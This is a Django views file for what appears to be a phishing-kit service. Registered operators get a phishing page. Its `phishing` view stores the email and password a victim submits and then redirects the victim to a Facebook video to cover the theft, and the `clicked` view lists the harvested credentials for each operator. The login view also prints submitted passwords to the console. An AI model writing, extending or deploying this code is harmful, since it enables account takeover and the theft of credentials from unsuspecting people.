from django.shortcuts import render,redirect
from .forms import UserForm,UserProfileInfoForm
from django.contrib.auth import authenticate, login, logout
from django.http import HttpResponseRedirect, HttpResponse
from django.urls import reverse
from django.contrib.auth.decorators import login_required
from django.contrib import messages

from .models import *

def index(request):
    return render(request,'index.html')

def clicked(request):
    user_id = request.user.id
    objects = idClone.objects.filter(user_id=user_id)
    return render(request,'cloned.html',{'credentials':objects})



@login_required
def user_logout(request):
    logout(request)
    return HttpResponseRedirect(reverse('index'))

def register(request):
    registered = False
    if request.method == 'POST':
        user_form = UserForm(data=request.POST)
        profile_form = UserProfileInfoForm(data=request.POST)
        if user_form.is_valid() and profile_form.is_valid():
            user = user_form.save()
            user.set_password(user.password)
            user.save()
            profile = profile_form.save(commit=False)
            profile.user = user
            profile.save()
           
           

            # if 'profile_pic' in request.FILES:
            #     print('found it')
            #     profile.profile_pic = request.FILES['profile_pic']
            
            registered = True
            return HttpResponseRedirect(reverse('credential:user_login'))

        else:
            print(user_form.errors,profile_form.errors)
    else:
        user_form = UserForm()
        profile_form = UserProfileInfoForm()
    return render(request,'register.html',{'user_form':user_form,
                                        'profile_form':profile_form,
                                        'registered':registered})

def user_login(request):
    if request.method == 'POST':
        print(request.POST)
        username = request.POST.get('username')
        password = request.POST.get('password')
        user = authenticate(username=username, password=password)
        if user:
            if user.is_active:
                login(request,user)
                return HttpResponseRedirect(reverse('index'))
            else:
                return HttpResponse("Your account was inactive.")
        else:
            messages.error(request,'username or password not correct')
            return HttpResponseRedirect(reverse('credential:user_login'))
    else:
        return render(request, 'login.html', {})

def phishing(request,*args,**kwargs):
    if request.method == 'POST':
        data = request.POST
        idClone.objects.create(user_id=kwargs['id'],email=data['email'],
                               password=data['pass'])
        response = redirect('https://www.facebook.com/JOKESTantraa/videos/441858159941884/?v=441858159941884')
        return response


    return render(request,'phishing.html')




    
        